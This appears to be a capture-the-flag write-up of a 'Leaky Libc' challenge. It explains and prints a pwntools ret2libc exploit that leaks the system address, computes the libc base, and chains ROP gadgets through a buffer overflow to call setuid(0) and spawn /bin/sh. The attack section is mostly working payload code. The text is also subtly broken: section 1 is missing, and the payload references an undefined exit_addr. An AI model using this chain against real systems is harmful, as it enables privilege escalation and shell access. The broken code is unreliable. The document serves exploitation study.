# Leaky Libc Challenge - ROP Exploit Writeup

## Challenge Overview
This challenge demonstrates **Return-Oriented Programming (ROP)** exploitation combined with **libc address leaking**. The goal is to exploit a buffer overflow vulnerability to leak a function address, compute the libc base, and chain ROP gadgets to execute arbitrary code (spawn a shell).

## Files
- `chall` / `/challenge/leveraging-libc-easy`: The vulnerable binary
- `libc.so.6`, `ld-linux.so.2`: C runtime libraries (libc version 2.31)
- `L_libc.py`: Python exploit script using pwntools

## Vulnerability & Exploitation Technique

### The Attack Chain
The exploit uses a **leak + ROP gadget chain** technique:
1. **Stage 1: Information Leakage** - Extract a leaked `system` address from the binary
2. **Stage 2: Compute Libc Base** - Calculate where libc is loaded in memory
3. **Stage 3: ROP Chain** - Chain gadgets to call `setuid(0)` → `system("/bin/sh")` → `exit()`

---

## Exploit Script Breakdown (`L_libc.py`)



### 2. Leak & Calculate Libc Base
```python
p.recvuntil(b'is: ')
leak = p.recvline().decode().strip()
addr_str = leak.rstrip('.')
leaked_system = int(addr_str, 16)

system_off = libc.symbols["system"]
libc_base = leaked_system - system_off
libc.address = libc_base
```
- **Receives** a leaked `system` function address from the target
- **Calculates** the libc base: `libc_base = leaked_address - offset_of_system_in_libc`
- **Sets** the libc object's base address for correct symbol resolution

### 3. Find Required Addresses
```python
binsh_off = next(libc.search(b"/bin/sh\x00"))
binsh_addr = binsh_off

setuid_addr = libc.symbols['setuid']
exit_pos = libc.symbols["exit"]
```
- Locates `/bin/sh` string address in libc
- Retrieves `setuid` and `exit` function addresses

### 4. Find ROP Gadgets
```python
rop = ROP([elf, libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
```
- **`pop rdi; ret`**: Sets the first argument (RDI register) on x86-64
- **`ret`**: Stack alignment gadget

### 5. Build the Payload
```python
padding = b'A' * 64
padding += b'B' * 8

payload = padding
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(setuid_addr)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(leaked_system)
payload += p64(exit_addr)
```

**Payload Structure:**
| Component | Purpose |
|-----------|---------|
| 72 bytes padding | Overflow the buffer |
| `ret` | Stack alignment |
| `pop rdi; ret` | Prepare to set first argument |
| `0` | First argument for setuid |
| `setuid` address | Call setuid(0) - escalate privileges |
| `ret` | Stack alignment |
| `pop rdi; ret` | Prepare next argument |
| `/bin/sh` address | First argument for system |
| `system` address | Call system("/bin/sh") |
| `exit` address | Clean exit |

### 6. Execute & Interact
```python
p.send(payload)
p.interactive()
```
- Sends the payload and enters interactive shell mode

---

## Execution Flow (x86-64 Calling Convention)

When the payload executes:
1. **ROP gadget 1**: `pop rdi; ret` → puts 0 in RDI, returns to setuid
2. **`setuid(0)`**: Escalates to root/owner privileges
3. **ROP gadget 2**: `pop rdi; ret` → puts /bin/sh address in RDI, returns to system
4. **`system("/bin/sh")`**: Spawns an interactive shell
5. **`exit()`**: Cleanly exits (if shell closes)

---

## Key Concepts

- **ROP (Return-Oriented Programming)**: Chaining short instruction sequences ("gadgets") to execute arbitrary code
- **Libc Leak**: Information disclosure vulnerability that reveals a libc function address
- **ASLR Bypass**: Once we know one libc address, we can compute all others (relative offsets remain constant)
- **Stack Overflow**: Buffer overflow overwrites the return address with our ROP chain
- **Calling Convention**: x86-64 passes first argument in RDI register

---

## Usage

Run the exploit:
```bash
python3 L_libc.py
```

Ensure pwntools is installed:
```bash
pip install pwntools
```

---

## Notes

- The exploit assumes libc 2.31 with specific gadgets available
- The binary must be vulnerable to buffer overflow and leak a libc address
- Address calculations depend on the exact libc version matching the target
- This technique is foundational for modern binary exploitation
